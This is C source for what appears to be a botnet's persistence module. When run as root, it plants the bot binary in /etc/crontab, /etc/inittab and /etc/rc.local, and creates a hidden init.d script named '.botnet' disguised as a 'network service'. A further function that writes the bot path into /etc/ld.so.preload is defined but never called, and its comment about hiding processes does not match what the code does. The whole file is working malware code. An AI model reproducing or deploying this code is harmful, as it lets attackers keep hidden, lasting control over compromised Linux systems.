#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/statvfs.h>

#include "includes.h"
#include "util.h"

#define PERSIST_CWD    "/tmp/.x"
#define PERSIST_RCLOCAL "/etc/rc.local"
#define PERSIST_INITTAB "/etc/inittab"
#define PERSIST_CRONTAB "/etc/crontab"
#define PERSIST_LD_PRELOAD "/etc/ld.so.preload"
#define PERSIST_INITD  "/etc/init.d"

static void get_bot_path(char *buf, int bufsz)
{
    char self[256];
    int len = readlink("/proc/self/exe", self, sizeof(self) - 1);
    if (len <= 0) {
        util_strcpy(buf, "/tmp/.x");
        return;
    }
    self[len] = '\0';
    util_strcpy(buf, self);
}

static int persist_via_crontab(void)
{
    char botpath[256];
    get_bot_path(botpath, sizeof(botpath));

    char cron_line[512];
    util_strcpy(cron_line, "*/2 * * * * root ");
    util_strcat(cron_line, botpath);
    util_strcat(cron_line, " >/dev/null 2>&1\n");

    // try /etc/crontab
    int fd = open(PERSIST_CRONTAB, O_RDONLY);
    if (fd >= 0) {
        char existing[8192];
        int n = read(fd, existing, sizeof(existing) - 1);
        close(fd);
        if (n > 0) {
            existing[n] = '\0';
            if (util_strstr(existing, botpath) != NULL)
                return 0; // already there
        }
    }

    fd = open(PERSIST_CRONTAB, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd < 0) return -1;
    write(fd, cron_line, util_strlen(cron_line));
    close(fd);
    return 0;
}

static int persist_via_inittab(void)
{
    char botpath[256];
    get_bot_path(botpath, sizeof(botpath));

    // check if already in inittab
    int fd = open(PERSIST_INITTAB, O_RDONLY);
    if (fd >= 0) {
        char buf[8192];
        int n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n > 0) {
            buf[n] = '\0';
            if (util_strstr(buf, botpath) != NULL)
                return 0;
        }
    }

    char line[512];
    util_strcpy(line, "::respawn:");
    util_strcat(line, botpath);
    util_strcat(line, " >/dev/null 2>&1\n");

    fd = open(PERSIST_INITTAB, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd < 0) return -1;
    write(fd, line, util_strlen(line));
    close(fd);
    return 0;
}

static int persist_via_rclocal(void)
{
    char botpath[256];
    get_bot_path(botpath, sizeof(botpath));

    int fd = open(PERSIST_RCLOCAL, O_RDONLY);
    if (fd >= 0) {
        char buf[8192];
        int n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n > 0) {
            buf[n] = '\0';
            if (util_strstr(buf, botpath) != NULL)
                return 0;
        }
    }

    char line[512];
    util_strcpy(line, botpath);
    util_strcat(line, " &\n");

    fd = open(PERSIST_RCLOCAL, O_WRONLY | O_CREAT | O_APPEND, 0755);
    if (fd < 0) return -1;
    write(fd, line, util_strlen(line));
    close(fd);
    return 0;
}

static int persist_via_ld_preload(void)
{
    char botpath[256];
    get_bot_path(botpath, sizeof(botpath));

    // LD_PRELOAD hides processes via readdir hook
    // check if already there
    int fd = open(PERSIST_LD_PRELOAD, O_RDONLY);
    if (fd >= 0) {
        char buf[8192];
        int n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n > 0) {
            buf[n] = '\0';
            if (util_strstr(buf, botpath) != NULL)
                return 0;
        }
    }

    fd = open(PERSIST_LD_PRELOAD, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd < 0) return -1;
    write(fd, botpath, util_strlen(botpath));
    write(fd, "\n", 1);
    close(fd);
    return 0;
}

static int persist_via_initd(void)
{
    char botpath[256];
    get_bot_path(botpath, sizeof(botpath));

    // create a minimal init.d script
    char script_path[256];
    util_strcpy(script_path, PERSIST_INITD);
    util_strcat(script_path, "/.botnet");

    char script_body[1024];
    util_strcpy(script_body,
        "#!/bin/sh\n"
        "### BEGIN INIT INFO\n"
        "# Provides:          net\n"
        "# Required-Start:    $network $syslog\n"
        "# Required-Stop:\n"
        "# Default-Start:     2 3 4 5\n"
        "# Default-Stop:\n"
        "# Short-Description: network service\n"
        "### END INIT INFO\n\n"
        "case \"$1\" in\n"
        "  start|restart)\n"
        "    ");
    util_strcat(script_body, botpath);
    util_strcat(script_body,
        " >/dev/null 2>&1 &\n"
        "    ;;\n"
        "esac\n"
        "exit 0\n");

    int fd = open(script_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (fd < 0) return -1;
    write(fd, script_body, util_strlen(script_body));
    close(fd);

    // try to register with update-rc.d or chkconfig
    char cmd[512];
    util_strcpy(cmd, "update-rc.d .botnet defaults 2>/dev/null || chkconfig --add .botnet 2>/dev/null");
    system(cmd);
    return 0;
}

int persist_run(void)
{
    if (geteuid() != 0) return -1;

    int result = -1;

    if (persist_via_inittab() == 0)
        result = 0;
    if (persist_via_crontab() == 0)
        result = 0;
    if (persist_via_rclocal() == 0)
        result = 0;
    if (persist_via_initd() == 0)
        result = 0;

    return result;
}
